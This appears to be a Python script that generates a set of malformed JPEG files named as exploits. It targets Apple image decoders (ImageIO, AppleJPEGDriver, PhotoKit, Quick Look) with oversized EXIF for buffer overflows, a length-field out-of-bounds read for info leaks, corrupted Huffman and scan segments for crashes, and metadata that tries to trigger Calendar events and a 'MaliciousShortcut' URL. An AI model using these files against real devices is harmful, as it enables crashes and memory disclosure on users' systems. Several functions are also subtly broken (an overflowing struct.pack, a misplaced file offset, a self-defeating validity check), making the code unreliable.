import os
import struct
import random
from PIL import Image
from typing import Optional, List

class MaliciousJPEGGenerator:
    def __init__(self, output_dir: str = "malicious_jpegs", seed: Optional[int] = None):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.base_image = Image.new('RGB', (32, 32), color='black')  # Smaller base for speed
        if seed:
            random.seed(seed)

    def _write_jpeg_segment(self, data: bytes, marker: int) -> bytes:
        """Helper to create a JPEG segment with given marker and data."""
        return struct.pack('>H', marker) + struct.pack('>H', len(data) + 2) + data

    def _validate_jpeg(self, filename: str) -> bool:
        """Basic validation: Check SOI/EOI markers."""
        with open(f"{self.output_dir}/{filename}", 'rb') as f:
            data = f.read()
            return data.startswith(b'\xFF\xD8') and data.endswith(b'\xFF\xD9')

    def craft_illegal_submode(self, filename: str) -> None:
        """Generate JPEG with illegal decode/encode submode."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(0)
            data = f.read()
            sof0_pos = data.find(b'\xFF\xC0')
            if sof0_pos != -1:
                f.seek(sof0_pos + 4)
                f.write(struct.pack('>H', 0xFFFF))
        if not self._validate_jpeg(filename):
            print(f"Warning: {filename} invalid after mutation")

    def craft_invalid_dma(self, filename: str) -> None:
        """Generate JPEG with invalid DMA addresses in APPn segment."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            app_data = struct.pack('>Q', 0xDEADBEEFDEADBEEF)
            app_segment = self._write_jpeg_segment(app_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)

    def craft_unsupported_format(self, filename: str) -> None:
        """Generate JPEG with unsupported pixel format."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(0)
            data = f.read()
            sof0_pos = data.find(b'\xFF\xC0')
            if sof0_pos != -1:
                f.seek(sof0_pos + 7)
                f.write(struct.pack('>B', 0xFF))

    def craft_illegal_dimensions(self, filename: str) -> None:
        """Enhanced: Extreme dimensions for Tungsten OOM."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(0)
            data = f.read()
            sof0_pos = data.find(b'\xFF\xC0')
            if sof0_pos != -1:
                # Bogus large/negative for CGImage reject
                f.seek(sof0_pos + 5)
                f.write(struct.pack('>HH', 0xFFFFFFFF, 0xFFFF0000))  # Overflow width/height

    def craft_misaligned_stride(self, filename: str) -> None:
        """Generate JPEG with misaligned stride in APPn segment."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            app_data = struct.pack('>I', 0x3)
            app_segment = self._write_jpeg_segment(app_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)

    def craft_malicious_icc_profile(self, filename: str) -> None:
        """Generate JPEG with a malicious ICC color profile."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            icc_data = b'ICC_PROFILE\x00' + b'\xFF' + b'\x00' * 1000
            app_segment = self._write_jpeg_segment(icc_data, 0xFFE2)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)

    def craft_corrupted_exif(self, filename: str) -> None:
        """Generate JPEG with corrupted EXIF metadata."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            exif_data = b'Exif\x00\x00' + b'MM\x00\x2A' + b'\xFF\xFF\xFF\xFF' + b'\x00' * 500
            app_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)

    def craft_malicious_xmp(self, filename: str) -> None:
        """Generate JPEG with malicious XMP metadata."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            xmp_data = b'http://ns.adobe.com/xap/1.0/\x00' + b'<x:xmpmeta>' + b'\xFF' * 1000
            app_segment = self._write_jpeg_segment(xmp_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)

    def craft_corrupted_scan_data(self, filename: str) -> None:
        """Enhanced: Truncate SOS for PHFig -16994/-12902 compression faults."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            data = f.read()
            sos_pos = data.find(b'\xFF\xDA')
            if sos_pos != -1:
                # Truncate after partial SOS (incomplete stream)
                f.seek(sos_pos + random.randint(5, 20))
                f.truncate()
                # No EOI for AppleJPEG -1
        print(f"Injected truncated scan for {filename}")

    def craft_malformed_huffman_tables(self, filename: str) -> None:
        """Generate JPEG with malformed Huffman tables to crash the decoder."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            data = f.read()
            dht_pos = data.find(b'\xFF\xC4')
            if dht_pos != -1:
                f.seek(dht_pos + 4)
                f.write(b'\xFF' * 16 + b'\x00' * 100)

    def craft_oversized_metadata(self, filename: str) -> None:
        """Generate JPEG with oversized metadata to trigger buffer overflows."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            exif_data = b'Exif\x00\x00' + b'MM\x00\x2A' + b'\x00\x00\x00\x08' + b'\xFF' * 65519
            app_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)

    def craft_invalid_sos_segment(self, filename: str) -> None:
        """Generate JPEG with invalid SOS segment to crash AppleJPEGDriver."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            data = f.read()
            sos_pos = data.find(b'\xFF\xDA')
            if sos_pos != -1:
                f.seek(sos_pos + 2)
                f.write(struct.pack('>H', 0x0006) + b'\xFF' + b'\x00\x00' * 2)

    def craft_info_leak_via_length(self, filename: str) -> None:
        """Generate JPEG with oversized COM for OOB read (info leak)."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", "r+b") as f:
            f.seek(2)
            original_data = f.read()
            marker = b'\xFF\xFE'
            length = struct.pack('>H', 4096) 
            actual_data = b'A' * 16
            malicious_segment = marker + length + actual_data
            f.seek(0)
            f.write(b'\xFF\xD8' + malicious_segment + original_data)

    def craft_quicklook_trigger(self, filename: str) -> None:
        """Generate JPEG with malformed EXIF thumbnail to trigger Quick Look overlay."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            thumbnail_data = b'\xFF\xD8' + b'\xFF' * 100 + b'\x00' * 500
            exif_data = (
                b'Exif\x00\x00' + b'MM\x00\x2A' +
                b'\x00\x00\x00\x08' + b'\x00\x02' +
                b'\x02\x01' + b'\x00\x04' + b'\x00\x00\x00\x01' + struct.pack('>I', 0x00000020) +
                b'\x02\x02' + b'\x00\x04' + b'\x00\x00\x00\x01' + struct.pack('>I', len(thumbnail_data)) +
                b'\x00\x00' + thumbnail_data
            )
            app_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)

    def craft_calendar_trigger(self, filename: str) -> None:
        """Generate JPEG with metadata to trigger the Calendar app."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            exif_data = (
                b'Exif\x00\x00' + b'MM\x00\x2A' +
                b'\x00\x00\x00\x08' + b'\x00\x01' +
                b'\x01\x32' + b'\x00\x02' + b'\x00\x00\x00\x14' + struct.pack('>I', 0x00000020) +
                b'\x00\x00' + b'2025:04:25 12:00:00\x00'
            )
            exif_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            ical_data = (
                b'BEGIN:VCALENDAR\n' + b'VERSION:2.0\n' +
                b'BEGIN:VEVENT\n' + b'SUMMARY:Malicious Event\n' +
                b'DTSTART:20250425T120000\n' + b'DTEND:20250425T130000\n' +
                b'END:VEVENT\n' + b'END:VCALENDAR\n'
            )
            xmp_data = (
                b'http://ns.adobe.com/xap/1.0/\x00' +
                b'<x:xmpmeta xmlns:x="adobe:ns:meta/">' +
                b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">' +
                b'<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">' +
                f'<dc:description>{ical_data.decode()}</dc:description>'.encode() +
                b'</rdf:Description></rdf:RDF></x:xmpmeta>'
            )
            xmp_segment = self._write_jpeg_segment(xmp_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + exif_segment + xmp_segment + rest)

    def craft_shortcut_trigger(self, filename: str) -> None:
        """Generate JPEG with metadata to trigger a Shortcut."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            shortcut_url = b'shortcuts://run-shortcut?name=MaliciousShortcut'
            xmp_data = (
                b'http://ns.adobe.com/xap/1.0/\x00' +
                b'<x:xmpmeta xmlns:x="adobe:ns:meta/">' +
                b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">' +
                b'<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">' +
                f'<dc:description>{shortcut_url.decode()}</dc:description>'.encode() +
                b'</rdf:Description></rdf:RDF></x:xmpmeta>'
            )
            app_segment = self._write_jpeg_segment(xmp_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)

    # New crafts targeting specific errors
    def craft_invalid_header(self, filename: str) -> None:
        """For ImageIO -50: Corrupt SOI/SOF0 for initImage paramErr."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(0)
            f.write(b'\xFF\xD9')  # Wrong SOI -> paramErr on reader init
            sof0_pos = f.read().find(b'\xFF\xC0')
            if sof0_pos != -1:
                f.seek(sof0_pos)
                f.write(b'\xFF\xC1')  # Invalid SOF type
        print(f"Injected invalid header for ImageIO -50 at {filename}")

    def craft_null_resource(self, filename: str) -> None:
        """For NSCocoaErrorDomain -1: Bogus null asset in EXIF."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            exif_data = b'Exif\x00\x00' + b'MM\x00\x2A' + b'\x00\x00\x00\x00' + b'\xFF\xFF'  # Null offsets
            app_segment = self._write_jpeg_segment(exif_data, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
        print(f"Injected null resource for PhotoKit -1 at {filename}")

    def craft_partial_stream(self, filename: str) -> None:
        """For AppleJPEG -1: Incomplete without EOI."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            data = f.read()
            eoi_pos = data.rfind(b'\xFF\xD9')
            if eoi_pos != -1:
                f.truncate(eoi_pos)  # Cut before EOI
        print(f"Injected partial stream for AppleJPEG -1 at {filename}")

    def craft_bogus_cgsize(self, filename: str) -> None:
        """For Tungsten/0x0 size: Bad dims in JFIF APP0."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            jfif_data = b'JFIF\x00' + b'\x01\x02' + b'\x00' * 3 + struct.pack('>HH', 0, 0)  # 0x0 size
            app_segment = self._write_jpeg_segment(jfif_data, 0xFFE0)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
        print(f"Injected bogus CG size for Tungsten at {filename}")

    def craft_invalid_codec(self, filename: str) -> None:
        """For PHFig -16994: Fake HEIC in JPEG for transcoding fault."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            f.seek(2)
            heic_fake = b'ftypheic' + b'\x00' * 20  # HEIC sig in APP
            app_segment = self._write_jpeg_segment(heic_fake, 0xFFE1)
            rest = f.read()
            f.seek(0)
            f.write(b'\xFF\xD8' + app_segment + rest)
        print(f"Injected invalid codec for PHFig -16994 at {filename}")

    def craft_corrupt_chunk(self, filename: str) -> None:
        """For ImageIO -50: Invalid chunk length in DQT."""
        self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
        with open(f"{self.output_dir}/{filename}", 'r+b') as f:
            data = f.read()
            dqt_pos = data.find(b'\xFF\xDB')
            if dqt_pos != -1:
                f.seek(dqt_pos + 2)
                f.write(struct.pack('>H', 0xFFFF))  # Oversized length
        print(f"Injected corrupt chunk for ImageIO -50 at {filename}")

    def generate_all(self, prefix: str = "exploit") -> List[str]:
        """Generate enhanced set of JPEGs targeting observed errors."""
        files = []
        vulnerability_functions = [
            self.craft_illegal_submode,
            self.craft_invalid_dma,
            self.craft_unsupported_format,
            self.craft_illegal_dimensions,
            self.craft_misaligned_stride,
            self.craft_malicious_icc_profile,
            self.craft_corrupted_exif,
            self.craft_malicious_xmp,
            self.craft_corrupted_scan_data,
            self.craft_malformed_huffman_tables,
            self.craft_oversized_metadata,
            self.craft_invalid_sos_segment,
            self.craft_info_leak_via_length,
            self.craft_quicklook_trigger,
            self.craft_calendar_trigger,
            self.craft_shortcut_trigger,
            self.craft_invalid_header,  # New for -50
            self.craft_null_resource,   # New for -1
            self.craft_partial_stream,  # New for AppleJPEG -1
            self.craft_bogus_cgsize,    # New for Tungsten
            self.craft_invalid_codec,   # New for PHFig
            self.craft_corrupt_chunk    # New for -50 chunks
        ]
        
        for i, func in enumerate(vulnerability_functions):
            filename = f"{prefix}_{i:02d}.jpg"
            func(filename)
            if self._validate_jpeg(filename):
                files.append(filename)
            else:
                print(f"Skipping invalid {filename}")
        return files

def main():
    seed = random.randint(1, 10000)  # Reproducible randomness
    generator = MaliciousJPEGGenerator(seed=seed)
    files = generator.generate_all()
    print(f"Generated {len(files)} valid JPEGs (seed: {seed}): {', '.join(files)}")
    print(f"Files saved in ./{generator.output_dir}/")

if __name__ == "__main__":
    main()
